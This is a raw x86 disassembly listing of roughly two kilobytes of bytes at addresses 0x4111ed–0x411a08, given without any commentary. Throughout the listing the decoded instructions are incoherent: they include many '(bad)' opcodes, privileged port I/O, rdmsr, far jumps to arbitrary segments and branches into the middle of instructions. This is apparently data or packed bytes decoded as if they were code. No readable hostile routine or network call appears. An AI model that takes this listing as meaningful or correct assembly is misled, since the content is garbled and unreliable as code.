  4111ed:	sbb    BYTE PTR [ebp+0x30a8650f],cl
  4111f3:	aad    0x35
  4111f5:	or     al,BYTE PTR [esi+ecx*2-0x4a]
  4111f9:	mov    edx,0x20979435
  4111fe:	mov    ah,0xcf
  411200:	xchg   edi,eax
  411201:	adc    eax,0xc141a83c
  411206:	js     0x4111e5
  411208:	out    dx,al
  411209:	mov    BYTE PTR [edi-0xf],dh
  41120c:	adc    ebp,DWORD PTR [edi+0x15]
  41120f:	push   ebp
  411210:	and    al,0x72
  411212:	retf   
  411213:	push   es
  411214:	jno    0x4111f9
  411216:	sub    bh,BYTE PTR [ebx+0x5b]
  411219:	xchg   DWORD PTR [esi-0x3e],eax
  41121c:	mov    ebx,DWORD PTR [edx]
  41121e:	sub    BYTE PTR [edx],0x93
  411221:	fldcw  WORD PTR [ebx-0x36]
  411224:	aam    0x81
  411226:	lea    ecx,[edi-0x37]
  411229:	or     al,0xb1
  41122b:	pop    ebp
  41122c:	push   ecx
  41122d:	dec    edi
  41122e:	jmp    0xd782:0xf8ab29d3
  411235:	(bad)  
  411237:	adc    DWORD PTR [ecx-0x32],0xffffffec
  41123b:	loope  0x411270
  41123d:	stos   DWORD PTR es:[edi],eax
  41123e:	pop    ecx
  41123f:	test   BYTE PTR [edi+edx*1+0x2ce9cfb9],ch
  411246:	adc    cl,BYTE PTR [ebp+0x43820725]
  41124c:	(bad)  
  41124d:	std    
  41124e:	(bad)  
  411250:	test   eax,0x850f9956
  411255:	and    esi,edx
  411257:	jge    0x41127a
  411259:	mov    eax,ds:0x18734bb4
  41125e:	shl    DWORD PTR [ebx-0x20],cl
  411261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411262:	pop    edx
  411263:	xchg   ecx,eax
  411264:	xor    BYTE PTR [edx-0x30],dl
  411267:	dec    esp
  411268:	jecxz  0x411214
  41126a:	int3   
  41126b:	aam    0x64
  41126d:	repz sub bh,dh
  411270:	shl    BYTE PTR ds:0xae3b3d9,0x29
  411277:	ds ins BYTE PTR es:[edi],dx
  411279:	bound  edx,QWORD PTR [esi-0x2b]
  41127c:	add    ebp,DWORD PTR [edx-0x6f]
  41127f:	push   edi
  411280:	sub    eax,0xd0990781
  411285:	mov    bl,0x36
  411287:	stc    
  411288:	mov    ah,0x1b
  41128a:	dec    edx
  41128b:	pop    edx
  41128c:	retf   
  41128d:	xchg   ebx,eax
  41128e:	push   0xffffffbd
  411290:	aas    
  411291:	in     eax,dx
  411292:	je     0x411245
  411294:	adc    al,0xd2
  411296:	ret    0x5cc3
  411299:	cmp    BYTE PTR [esi+ebp*1-0x1bd0b707],dh
  4112a0:	dec    esi
  4112a1:	(bad)  
  4112a2:	shl    BYTE PTR ss:0x76e4cc91,1
  4112a9:	mov    al,ds:0x142abfae
  4112ae:	pop    ebp
  4112af:	pop    ebp
  4112b0:	aad    0x65
  4112b2:	retf   
  4112b3:	add    DWORD PTR [ebx+0x43],ebx
  4112b6:	in     eax,0xbd
  4112b8:	mov    bl,0xa9
  4112ba:	bound  edi,QWORD PTR [edx+0x58]
  4112bd:	test   al,0x98
  4112bf:	push   ecx
  4112c0:	push   esp
  4112c1:	rcr    BYTE PTR [edx+0x146d82f5],1
  4112c7:	mov    edi,0x20f9fe10
  4112cc:	rol    DWORD PTR [ebp-0x244b30f5],0x7a
  4112d3:	xchg   ecx,eax
  4112d4:	dec    esp
  4112d5:	mov    ah,BYTE PTR [ebx+ebx*4+0x5c]
  4112d9:	bnd jo 0x411352
  4112dc:	cmp    eax,0x350e4ee6
  4112e1:	adc    cl,BYTE PTR ds:0x32f85791
  4112e7:	ret    0xcc0e
  4112ea:	sub    al,0x20
  4112ec:	sbb    esi,ebp
  4112ee:	lods   al,BYTE PTR ds:[esi]
  4112ef:	add    ah,bl
  4112f1:	push   eax
  4112f2:	mov    eax,DWORD PTR [ecx]
  4112f4:	mov    ecx,0xdd456bd0
  4112f9:	cmp    ebp,DWORD PTR [edx-0x145cfeac]
  4112ff:	pushf  
  411300:	mov    edx,0x29faba60
  411305:	jle    0x41132d
  411307:	dec    ebx
  411308:	(bad)  
  41130a:	icebp  
  41130b:	jle    0x4112b3
  41130d:	fsubr  st,st(2)
  41130f:	pop    esp
  411310:	add    DWORD PTR [ecx+0x2a8932dc],0xfffffff5
  411317:	pop    eax
  411318:	inc    edx
  411319:	push   es
  41131a:	mov    edx,0x84e9017a
  41131f:	mov    esp,0x7f92dd23
  411324:	or     al,0x86
  411326:	(bad)  
  411328:	jg     0x41133a
  41132a:	repnz dec edx
  41132c:	int3   
  41132d:	add    edx,DWORD PTR ds:0xa1349370
  411333:	cmp    edx,DWORD PTR [ebp+0x83e96a]
  411339:	fwait
  41133a:	sub    al,0xd5
  41133c:	sbb    DWORD PTR [ebx],esp
  41133e:	mov    eax,0xc5af0899
  411343:	xor    BYTE PTR [ecx],cl
  411345:	loop   0x4112f7
  411347:	mov    ds:0x5e1b96a,al
  41134c:	sahf   
  41134d:	popa   
  41134e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41134f:	leave  
  411350:	jbe    0x4113be
  411352:	xor    DWORD PTR [edi-0x6a93a0e2],edi
  411358:	mov    bh,0x21
  41135a:	sub    DWORD PTR [edx-0x557dfdfc],edx
  411360:	scas   al,BYTE PTR es:[edi]
  411361:	cmovl  edx,ebx
  411364:	xchg   ebx,eax
  411365:	push   ds
  411366:	in     eax,0x30
  411368:	jb     0x41138e
  41136a:	repz xchg esi,eax
  41136c:	or     BYTE PTR [ebp-0x27],bh
  41136f:	push   0xffffffd4
  411371:	xchg   BYTE PTR [edx],ch
  411373:	inc    esi
  411374:	(bad)  [ebx]
  411376:	(bad)  
  411377:	js     0x411320
  411379:	xchg   edi,eax
  41137a:	pop    edi
  41137b:	into   
  41137c:	imul   edi,esi,0x68
  41137f:	and    eax,0xba332379
  411385:	idiv   BYTE PTR ds:[ebp+0x51]
  411389:	cmp    edx,DWORD PTR [ebp-0x26]
  41138c:	jle    0x411341
  41138e:	xchg   esp,eax
  41138f:	adc    al,0xa0
  411391:	push   eax
  411392:	dec    ecx
  411393:	fmul   QWORD PTR [ebp+0x5200cda4]
  411399:	add    ebp,DWORD PTR gs:[eax-0xed5929a]
  4113a0:	mov    edi,0x18725394
  4113a5:	in     eax,0xa4
  4113a7:	imul   eax,DWORD PTR [edx+0x63],0xf354b251
  4113ae:	jecxz  0x4113ed
  4113b0:	rcr    ecx,0x41
  4113b3:	(bad)  
  4113b4:	in     al,dx
  4113b5:	cdq    
  4113b6:	icebp  
  4113b7:	mov    edx,0xf023de31
  4113bc:	jne    0x41141d
  4113be:	sbb    ebx,DWORD PTR [esi+ecx*1]
  4113c1:	xchg   esp,eax
  4113c2:	dec    esi
  4113c3:	xchg   edx,eax
  4113c4:	dec    edi
  4113c5:	add    al,0xab
  4113c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113c8:	mov    gs,WORD PTR [eax]
  4113ca:	and    eax,0x4f241aff
  4113cf:	mov    ebp,0xf93e2b5c
  4113d4:	imul   ebp,DWORD PTR [ebx+0x4c],0x7
  4113d8:	add    al,0x82
  4113db:	ins    BYTE PTR es:[edi],dx
  4113dc:	ja     0x41145d
  4113de:	and    DWORD PTR [ecx+0x6d],esi
  4113e1:	inc    ebx
  4113e2:	ror    DWORD PTR [edx-0x55],1
  4113e5:	mul    BYTE PTR [bx+0x11]
  4113e9:	sbb    BYTE PTR [ebp-0x5528f29c],bh
  4113ef:	push   edx
  4113f0:	fisub  WORD PTR ds:[esi-0x23]
  4113f4:	jmp    0xe30ac5ce
  4113f9:	push   eax
  4113fa:	xor    ah,cl
  4113fc:	fsub   DWORD PTR [ebx+eiz*8-0x3fde60c3]
  411403:	data16 sub BYTE PTR [ebx],0x62
  411407:	mov    ebx,0x806c4273
  41140c:	fwait
  41140d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41140e:	dec    eax
  41140f:	adc    al,0xda
  411411:	cld    
  411412:	mov    cl,0x8f
  411414:	loop   0x4113f8
  411416:	mov    ebp,db2
  411419:	popa   
  41141a:	sbb    cl,cl
  41141c:	pusha  
  41141d:	or     ch,0x62
  411420:	add    DWORD PTR [edi],eax
  411422:	scas   eax,DWORD PTR es:[edi]
  411423:	push   ecx
  411425:	(bad)  
  411426:	mov    eax,0xe55e700
  41142b:	scas   al,BYTE PTR es:[edi]
  41142c:	in     al,dx
  41142d:	jmp    0x411416
  41142f:	or     BYTE PTR [edx+0x4acb8d58],dl
  411435:	fimul  WORD PTR [edx-0x34b2f3b7]
  41143b:	cdq    
  41143c:	bound  eax,QWORD PTR [esi+0x66be56d]
  411442:	push   eax
  411443:	arpl   sp,si
  411445:	sbb    eax,0xca76ce84
  41144a:	data16 and ch,BYTE PTR [edx+0x3785896f]
  411451:	adc    ebp,edx
  411453:	pop    esi
  411454:	bound  esp,QWORD PTR [ecx-0x1a119042]
  41145a:	dec    ebx
  41145b:	imul   ecx,DWORD PTR [ecx],0x98787dd
  411461:	imul   edi,DWORD PTR [ecx+0x61],0xffffffb0
  411465:	jl     0x411488
  411467:	and    eax,0xf3dd5096
  41146c:	mov    ds:0x80286e09,al
  411471:	popa   
  411472:	mov    ebx,DWORD PTR [edi+0x5abcd6bf]
  411478:	and    BYTE PTR ds:0x2e5f76df,bh
  41147e:	ret    0x6f76
  411481:	(bad)  
  411482:	jg     0x41146b
  411484:	les    esi,FWORD PTR [edi+0x50]
  411487:	xchg   edx,eax
  411488:	inc    edx
  411489:	cwde   
  41148a:	sub    DWORD PTR [ebx-0x14],0x3748c39d
  411491:	push   edx
  411492:	sar    DWORD PTR [ebx-0x5b8b5c84],0x2a
  411499:	xchg   BYTE PTR [edx],ch
  41149b:	jns    0x411463
  41149d:	cmp    DWORD PTR [eax+0x19],eax
  4114a0:	neg    BYTE PTR [ebx]
  4114a2:	lods   eax,DWORD PTR ds:[esi]
  4114a3:	lea    edi,[ebx-0x6e]
  4114a6:	pusha  
  4114a7:	call   0x5c104156
  4114ac:	pop    ecx
  4114ad:	test   DWORD PTR [edx+eax*1+0x2ecf970b],ebp
  4114b4:	xor    eax,0xcc890f94
  4114b9:	sbb    al,0x2e
  4114bb:	mov    dh,0x4a
  4114bd:	cmp    al,0x23
  4114bf:	cmp    eax,0xde03dc1d
  4114c4:	call   0x2d49:0x92282a60
  4114cb:	jge    0x411457
  4114cd:	mov    ecx,0xea09f4d8
  4114d2:	out    dx,al
  4114d3:	xlat   BYTE PTR ds:[ebx]
  4114d4:	and    al,0x62
  4114d6:	in     al,dx
  4114d7:	sbb    BYTE PTR [esi-0x6b],dh
  4114da:	ins    DWORD PTR es:[edi],dx
  4114db:	shr    BYTE PTR [edx-0x5f],cl
  4114de:	das    
  4114df:	mov    DWORD PTR [edx+0x477354da],eax
  4114e5:	cmp    esi,esp
  4114e7:	mov    edx,0x26345750
  4114ec:	and    ebx,ecx
  4114ee:	xchg   esi,eax
  4114ef:	jge    0x4114a8
  4114f1:	push   ebp
  4114f2:	cs cwde 
  4114f4:	adc    esi,DWORD PTR [esi+0x1f]
  4114f7:	add    BYTE PTR [ebx-0x28d41184],0xc0
  4114fe:	mov    ch,0xed
  411500:	shl    BYTE PTR [esp+ecx*2],cl
  411503:	(bad)  
  411504:	and    al,0xb7
  411506:	pop    es
  411507:	xor    DWORD PTR [ebx-0x1663d78a],ebp
  41150d:	sub    al,0xdb
  41150f:	es adc eax,0xca3d7855
  411515:	test   ebx,0x726aef61
  41151b:	mov    ds:0xbdc882d3,al
  411520:	xchg   ah,cl
  411522:	push   edi
  411523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411524:	xchg   ecx,eax
  411525:	ret    
  411526:	cmp    DWORD PTR [ebx],esp
  411528:	pop    ebp
  411529:	push   0x52c89d36
  41152e:	call   DWORD PTR [edi]
  411530:	push   ds
  411531:	clc    
  411532:	mov    esi,0xb4695ead
  411537:	push   ebp
  411538:	fidivr DWORD PTR [edx-0x55]
  41153b:	test   DWORD PTR [edi],0x88c5ce40
  411541:	sbb    eax,ebp
  411543:	test   al,0x71
  411545:	jge    0x4115c0
  411547:	sbb    BYTE PTR [bp+si+0x4b2f],cl
  41154c:	xor    al,0x44
  41154e:	cmp    DWORD PTR [edx-0x6affc807],eax
  411554:	fidiv  WORD PTR [ebp+edx*1-0x75]
  411558:	mov    ds:0xbe386084,al
  41155d:	stc    
  41155e:	sahf   
  41155f:	in     al,dx
  411560:	sbb    BYTE PTR [ebp-0x78952e4c],al
  411566:	fbstp  TBYTE PTR [eax+0xd]
  411569:	jbe    0x41156a
  41156b:	pop    esi
  41156c:	loop   0x411551
  41156e:	js     0x4115b7
  411570:	call   0xbf52e056
  411575:	gs mov edi,0x35664d14
  41157b:	inc    ebp
  41157c:	sbb    BYTE PTR [eax],dh
  41157e:	ret    
  41157f:	mov    ch,0x40
  411581:	(bad)  
  411582:	addr16 jae 0x41151c
  411585:	pop    esp
  411586:	loopne 0x41152e
  411588:	pop    esp
  411589:	and    DWORD PTR [esi-0xc],0xc
  41158d:	and    al,0x74
  41158f:	in     al,dx
  411590:	pshufw mm3,QWORD PTR [ebx+0x23],0x4a
  411595:	jmp    0x4d4fa57e
  41159a:	mov    ecx,0x8da6f20e
  41159f:	test   BYTE PTR [ebp+esi*4-0x2171de59],0x92
  4115a7:	adc    eax,0x77ed4da3
  4115ac:	ficom  WORD PTR [eax]
  4115ae:	aas    
  4115af:	or     DWORD PTR [esi],0x3e391f35
  4115b5:	shl    DWORD PTR [edi+0x36efd441],1
  4115bb:	rcr    DWORD PTR [edx+0x2f],1
  4115be:	jmp    0x76b3:0x4a177120
  4115c5:	sahf   
  4115c6:	push   ds
  4115c7:	ror    DWORD PTR [esi],1
  4115c9:	bound  esi,QWORD PTR [ecx]
  4115cb:	mov    eax,ds:0xcc1115a0
  4115d0:	pop    esi
  4115d1:	(bad)  
  4115d3:	int    0xdc
  4115d5:	sahf   
  4115d6:	mov    BYTE PTR [esi-0x3dff0fce],ch
  4115dc:	mov    ds:0xa36ea04c,al
  4115e1:	inc    eax
  4115e2:	xor    BYTE PTR [eax],0x7d
  4115e5:	xor    al,0x17
  4115e7:	cmp    BYTE PTR [edi],dh
  4115e9:	xor    eax,0x22f0c9d5
  4115ee:	cmp    BYTE PTR [ebx],bh
  4115f0:	repnz jecxz 0x411620
  4115f3:	mov    esi,0x2da836d0
  4115f8:	add    BYTE PTR ds:0x49c7afd5,al
  4115fe:	jp     0x41163c
  411600:	xor    DWORD PTR ds:0xa520b610,0xd6863546
  41160a:	enter  0x60f9,0x68
  41160e:	cmp    eax,0x78865f0b
  411613:	xor    eax,0xc43f83a
  411618:	adc    al,0x89
  41161a:	xchg   ch,dl
  41161c:	cmp    dh,dl
  41161e:	inc    eax
  41161f:	imul   ebx,DWORD PTR [edx+0x4c2fb71d],0x4e
  411626:	fs inc ebp
  411628:	push   esp
  411629:	add    BYTE PTR [eax],dl
  41162b:	cmp    al,0x61
  41162d:	pop    ecx
  41162e:	(bad)  
  41162f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411630:	cdq    
  411631:	fdiv   DWORD PTR [edx]
  411633:	mov    cl,dl
  411635:	and    al,0xe5
  411637:	jg     0x41168a
  411639:	pusha  
  41163a:	popf   
  41163b:	cmc    
  41163c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41163d:	sub    eax,0x31c6d764
  411642:	jmp    0xeb2ef885
  411647:	pop    ebx
  411648:	gs (bad) 
  41164a:	sub    DWORD PTR ds:0x6cf6174e,ebx
  411650:	mov    ds:0x6c3f887,eax
  411655:	fs add eax,0x1338a7b3
  41165b:	and    eax,0x51281dc0
  411660:	sub    esi,ebp
  411662:	aas    
  411663:	in     eax,dx
  411664:	or     DWORD PTR [edx-0x31],ecx
  411667:	pop    ss
  411668:	cdq    
  411669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41166a:	arpl   WORD PTR [eax-0x3a],bp
  41166d:	jle    0x4116c0
  41166f:	inc    edx
  411670:	pop    eax
  411671:	ret    
  411672:	push   es
  411673:	cld    
  411674:	mov    edi,0xae95c02a
  411679:	ins    DWORD PTR es:[edi],dx
  41167a:	je     0x4116f1
  41167c:	loop   0x4116fa
  41167e:	lods   al,BYTE PTR ds:[esi]
  41167f:	push   ebx
  411680:	jmp    0xac83110
  411685:	bound  edx,QWORD PTR [esp+ebp*8-0x44]
  411689:	adc    DWORD PTR [eax+0x7eccd8c8],ebp
  41168f:	dec    edi
  411690:	retf   
  411691:	cdq    
  411692:	sahf   
  411693:	icebp  
  411694:	add    eax,0x6
  411697:	ins    DWORD PTR es:[edi],dx
  411698:	mov    WORD PTR [ebp-0x221a63e8],?
  41169e:	mov    dl,0x88
  4116a0:	push   edi
  4116a1:	adc    ebx,DWORD PTR [edx+0x230f4279]
  4116a7:	dec    ebp
  4116a8:	mov    ebp,0x714690b2
  4116ad:	jnp    0x4116d2
  4116af:	cdq    
  4116b0:	mov    al,ds:0x4acab1ec
  4116b5:	fild   WORD PTR [esp+esi*8-0x24]
  4116b9:	outs   dx,DWORD PTR ds:[esi]
  4116ba:	pop    eax
  4116bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116bd:	sub    bl,ch
  4116bf:	mov    bl,0xd6
  4116c1:	out    0xd6,eax
  4116c3:	fwait
  4116c4:	mov    esp,0x2cf5b6d6
  4116c9:	mov    ds:0x82c576de,eax
  4116ce:	xchg   eax,eax
  4116d0:	popa   
  4116d1:	(bad)  
  4116d3:	xchg   DWORD PTR [ebx],esp
  4116d5:	and    BYTE PTR [esi-0x7b],bh
  4116d8:	jno    0x411699
  4116da:	pop    edx
  4116db:	dec    esp
  4116dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116dd:	fs mov DWORD PTR ds:[esi],ecx
  4116e1:	pop    ebp
  4116e2:	je     0x41175a
  4116e4:	(bad)  
  4116e5:	jge    0x4116d3
  4116e7:	add    eax,edx
  4116e9:	xchg   ebp,eax
  4116ea:	rcr    BYTE PTR [edx+0x59],1
  4116ed:	xchg   esi,eax
  4116ee:	aaa    
  4116ef:	rdmsr  
  4116f1:	fwait
  4116f2:	add    al,0x82
  4116f4:	shr    BYTE PTR [edx-0x46],0x1a
  4116f8:	jo     0x4116e7
  4116fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116fb:	inc    BYTE PTR [eax+eax*1-0x79]
  4116ff:	(bad)  [ecx-0x5]
  411702:	out    0x78,eax
  411704:	stc    
  411705:	lods   eax,DWORD PTR ds:[esi]
  411706:	lahf   
  411707:	jno    0x4116f5
  411709:	lock mov eax,ds:0x3bf242e4
  41170f:	es repnz popa 
  411712:	test   al,0x4
  411714:	fadd   DWORD PTR [edx]
  411716:	xchg   edi,eax
  411717:	inc    ebp
  411718:	fchs   
  41171a:	or     BYTE PTR [edx],cl
  41171c:	dec    edi
  41171d:	mov    ch,0xfa
  41171f:	nop
  411720:	add    ecx,DWORD PTR [eax+eax*4-0x1779506e]
  411727:	xchg   esi,eax
  411728:	xor    DWORD PTR [eax+edi*2+0x4f],eax
  41172c:	gs push ebp
  41172e:	cmp    DWORD PTR [edx],edi
  411730:	scas   eax,DWORD PTR es:[edi]
  411731:	add    eax,0xe1cf3826
  411736:	loopne 0x4116d5
  411738:	cs into 
  41173a:	push   0xffffffc2
  41173c:	sub    eax,0x69ca003
  411741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411742:	test   BYTE PTR [ebp-0x20],al
  411745:	jns    0x4116d1
  411747:	rol    BYTE PTR ds:0x36100880,cl
  41174d:	or     DWORD PTR [ebp-0x3ea27e65],0xffffffb4
  411754:	imul   edx,DWORD PTR [esi+0x60cba55e],0x3d
  41175b:	inc    ebp
  41175c:	rcr    DWORD PTR [edx],cl
  41175e:	jl     0x411777
  411760:	ins    BYTE PTR es:[edi],dx
  411761:	jmp    0xd51c:0x99446db3
  411768:	je     0x411754
  41176a:	cli    
  41176b:	push   ebp
  41176c:	cmp    DWORD PTR [esi-0x35],esi
  41176f:	mov    cl,0x5c
  411771:	ja     0x411713
  411773:	sub    ebx,DWORD PTR [ebp+ecx*4-0x28]
  411777:	pop    edx
  411778:	xchg   esi,eax
  411779:	pop    ecx
  41177a:	mov    esp,0x838dbef9
  41177f:	arpl   WORD PTR [ecx+edx*8],di
  411782:	push   edx
  411783:	or     al,0x28
  411785:	stc    
  411786:	adc    al,0x28
  411788:	pushf  
  411789:	fldcw  WORD PTR [esi-0x2fda6fb1]
  41178f:	sub    al,0xfe
  411791:	mov    ds:0xe27d92c1,al
  411796:	xor    al,0x88
  411798:	mov    ds:0x84fdea11,al
  41179d:	ret    
  41179e:	repz or eax,0x4237a8c7
  4117a4:	inc    ebp
  4117a5:	ja     0x4117f0
  4117a7:	adc    BYTE PTR [esi+eax*4+0x67d4e73],ch
  4117ae:	aaa    
  4117af:	iret   
  4117b0:	push   ebp
  4117b1:	fs mov ecx,0x4ad5f175
  4117b7:	das    
  4117b8:	inc    edx
  4117b9:	ins    BYTE PTR es:[edi],dx
  4117ba:	lahf   
  4117bb:	test   edx,esi
  4117bd:	pop    eax
  4117be:	retf   0x8b49
  4117c1:	das    
  4117c2:	mov    al,0xee
  4117c4:	pop    ebx
  4117c5:	and    al,0xae
  4117c7:	and    eax,DWORD PTR [eax-0x7dccfc46]
  4117cd:	sbb    BYTE PTR [ecx-0x42],ch
  4117d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d1:	data16 ins BYTE PTR es:[edi],dx
  4117d3:	bound  edi,QWORD PTR [ecx-0x167593d0]
  4117d9:	mov    ebp,0x5cacaf63
  4117de:	push   ebp
  4117df:	out    dx,eax
  4117e0:	dec    esp
  4117e1:	jno    0x4117d9
  4117e3:	adc    eax,0x9d55666a
  4117e8:	mov    ebx,0x21aaab16
  4117ed:	outs   dx,BYTE PTR ds:[esi]
  4117ee:	dec    ebx
  4117ef:	jno    0x411839
  4117f1:	cmp    edx,DWORD PTR [eax-0xe]
  4117f4:	sbb    bl,bh
  4117f6:	mov    ds:0x685b0a1c,eax
  4117fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117fc:	rol    BYTE PTR [ebp+0x63],1
  4117ff:	sar    DWORD PTR [esi],1
  411801:	pop    esp
  411802:	add    BYTE PTR [edx-0x10],0xfc
  411806:	fsubr  DWORD PTR [edx]
  411808:	xor    eax,ecx
  41180a:	shl    BYTE PTR [eax],0x7d
  41180d:	adc    BYTE PTR [ebx],dl
  41180f:	xchg   edx,eax
  411810:	aad    0x1f
  411812:	stc    
  411813:	leave  
  411814:	mov    edx,0x41b51dff
  411819:	sahf   
  41181a:	dec    esi
  41181b:	add    BYTE PTR [edi-0x67],0x48
  41181f:	adc    BYTE PTR [ebp+0x2818f4cd],cl
  411825:	inc    ebx
  411826:	mov    ebx,0x7bec70fe
  41182b:	aaa    
  41182c:	sbb    DWORD PTR [ecx+0x40a597b7],ebp
  411832:	aas    
  411833:	mov    ecx,0xf412bce0
  411838:	sub    esi,ecx
  41183a:	sub    BYTE PTR ds:0x4890,cl
  41183f:	xchg   ebx,eax
  411840:	out    dx,al
  411841:	xor    al,0xc
  411843:	es push ecx
  411845:	mov    ?,WORD PTR [eax-0x2dfe6d3f]
  41184b:	cli    
  41184c:	call   FWORD PTR [ebp+edi*2+0x53]
  411850:	or     BYTE PTR [ebx+edi*2+0x0],dh
  411854:	pop    edi
  411855:	xor    esi,DWORD PTR [edx-0x5ff0a389]
  41185b:	ins    BYTE PTR es:[edi],dx
  41185c:	xor    eax,0x25e3fb5c
  411861:	xor    DWORD PTR [edi+0xa701367],ecx
  411867:	js     0x41183f
  411869:	jne    0x4118ab
  41186b:	xchg   BYTE PTR [ebx+0x77],dh
  41186e:	mov    esi,0x974a772b
  411873:	stos   BYTE PTR es:[edi],al
  411874:	xchg   ecx,eax
  411875:	les    edi,FWORD PTR [ecx+0x2960d9a1]
  41187b:	in     al,0x6a
  41187d:	sub    dl,dh
  41187f:	mov    ds:0xd91b4d64,eax
  411884:	sub    esi,DWORD PTR [esp+edx*2]
  411887:	xor    bh,cl
  411889:	loope  0x41189f
  41188b:	adc    BYTE PTR [edx],0x65
  41188e:	popa   
  41188f:	xchg   BYTE PTR ds:0xb6bd2c11,dh
  411895:	xor    esp,DWORD PTR ss:[edx-0x54c85b39]
  41189c:	imul   al
  41189e:	fstp   DWORD PTR [ebx-0x4550d42b]
  4118a4:	out    0xae,eax
  4118a6:	test   eax,0xeb425c0f
  4118ab:	jb     0x41190c
  4118ad:	pop    ss
  4118ae:	push   ss
  4118af:	jmp    0x41185c
  4118b1:	dec    ebx
  4118b2:	ins    DWORD PTR es:[edi],dx
  4118b3:	stc    
  4118b4:	mov    ah,0x6d
  4118b6:	sbb    al,0x60
  4118b8:	(bad)  
  4118b9:	ds mov ah,0xc1
  4118bc:	jae    0x411862
  4118be:	jmp    0x513eccc1
  4118c3:	mov    ds:0x555dbeb6,eax
  4118c8:	add    al,0x9a
  4118ca:	ins    DWORD PTR es:[edi],dx
  4118cb:	popf   
  4118cc:	sub    BYTE PTR [ebp-0x2e],0xe3
  4118d0:	inc    esp
  4118d1:	mov    eax,ds:0xed128f91
  4118d6:	or     bh,bl
  4118d8:	pop    esi
  4118d9:	mov    WORD PTR [edi],cs
  4118db:	sbb    BYTE PTR [ecx+0x6c],al
  4118de:	shr    BYTE PTR [edi-0x335ea497],0x4
  4118e5:	add    eax,0xab451556
  4118ea:	dec    ebp
  4118eb:	jmp    0x4118e2
  4118ed:	adc    al,0xca
  4118ef:	add    bl,al
  4118f1:	or     eax,0xffffffa5
  4118f4:	icebp  
  4118f5:	inc    edi
  4118f6:	mov    al,0x3b
  4118f8:	pop    eax
  4118f9:	mov    dh,0x6b
  4118fb:	cwde   
  4118fc:	das    
  4118fd:	inc    edx
  4118fe:	add    BYTE PTR cs:[edi+0x42],0x46
  411903:	adc    al,0x2c
  411905:	inc    eax
  411906:	mov    ds:0xb43d2880,eax
  41190b:	stc    
  41190c:	and    edi,edi
  41190e:	(bad)  
  41190f:	in     eax,0xa5
  411911:	mov    edi,0xa3e0b56c
  411916:	xor    eax,0xc11d403c
  41191b:	dec    ebx
  41191c:	jle    0x411918
  41191e:	add    DWORD PTR [eax+0x40f6ae],edi
  411924:	inc    edx
  411925:	or     bh,ch
  411927:	add    DWORD PTR [ebx+0x78],edx
  41192a:	sti    
  41192b:	push   edi
  41192c:	cmp    DWORD PTR [ecx+edi*8],esp
  41192f:	mov    al,0x4e
  411931:	xor    DWORD PTR [ebp+0x15],esp
  411934:	cdq    
  411935:	mov    ds:0x4824d35f,al
  41193a:	mov    esp,0x5d5cc2e9
  41193f:	dec    ebx
  411940:	call   0x20bd:0xf2ad41df
  411947:	and    BYTE PTR ds:0xe10e4b83,0x63
  41194e:	sbb    ah,BYTE PTR [ebp+0x185386fe]
  411954:	dec    ebp
  411955:	or     al,0xe4
  411957:	jmp    0x411961
  411959:	xor    DWORD PTR [edi],0x7e
  41195c:	add    esi,DWORD PTR [ebx-0x73]
  41195f:	icebp  
  411960:	or     edi,DWORD PTR [edx-0x46]
  411963:	and    eax,0xa9d30135
  411968:	jle    0x4118fe
  41196a:	(bad)  
  41196b:	sub    dh,BYTE PTR [ebx-0x59d97102]
  411971:	arpl   WORD PTR [ebx],di
  411973:	adc    al,0x66
  411975:	cmp    DWORD PTR [ebp-0x6d],0x38
  411979:	mov    WORD PTR [edi-0x6c],fs
  41197c:	call   FWORD PTR [ebx]
  41197e:	(bad)  
  41197f:	fsubr  st(2),st
  411981:	js     0x411924
  411983:	retf   
  411984:	daa    
  411985:	mul    BYTE PTR [ebx]
  411987:	cmp    al,0xde
  411989:	xchg   edi,eax
  41198a:	outs   dx,BYTE PTR ds:[esi]
  41198b:	lock loop 0x41199b
  41198e:	or     ebp,esi
  411990:	or     esi,DWORD PTR [ecx+0x585922ca]
  411996:	lods   al,BYTE PTR ds:[esi]
  411997:	mov    ebp,0x7d46cacc
  41199c:	pop    esi
  41199d:	ja     0x4119d6
  41199f:	sub    BYTE PTR [ecx],ch
  4119a1:	pop    eax
  4119a2:	std    
  4119a3:	xor    eax,0x142a0b1d
  4119a8:	call   0xb7fa2ee7
  4119ad:	fisttp QWORD PTR [ebx+0x7a]
  4119b0:	sbb    al,BYTE PTR [ebx-0x676b0582]
  4119b6:	loopne 0x41199d
  4119b8:	shl    DWORD PTR [edx+0x60c7de8a],0xd3
  4119bf:	mov    WORD PTR [ecx-0x6f5c73ae],?
  4119c5:	dec    esp
  4119c6:	add    al,0x45
  4119c8:	pop    ss
  4119c9:	scas   al,BYTE PTR es:[edi]
  4119ca:	add    eax,0xdff7bbc0
  4119cf:	mov    dl,0xf
  4119d1:	(bad)  
  4119d2:	push   ebp
  4119d3:	adc    bl,cl
  4119d5:	je     0x411a2b
  4119d7:	je     0x4119b7
  4119d9:	clc    
  4119da:	out    0x4d,eax
  4119dc:	lock rcl DWORD PTR [ecx],1
  4119df:	sbb    BYTE PTR [edi-0x62886e7],al
  4119e5:	ss es jle 0x4119d0
  4119e9:	inc    esi
  4119ea:	call   0xae4f:0xa1f0f039
  4119f1:	sbb    edi,DWORD PTR [edx+0x4e0da415]
  4119f7:	push   eax
  4119f8:	aaa    
  4119f9:	popa   
  4119fa:	sub    al,0x97
  4119fc:	fs bswap ebp
  4119ff:	pop    ecx
  411a00:	mov    ecx,0x8a089421
  411a05:	aaa    
  411a06:	add    esp,DWORD PTR [ecx]
  411a08:	jb     0x411a29
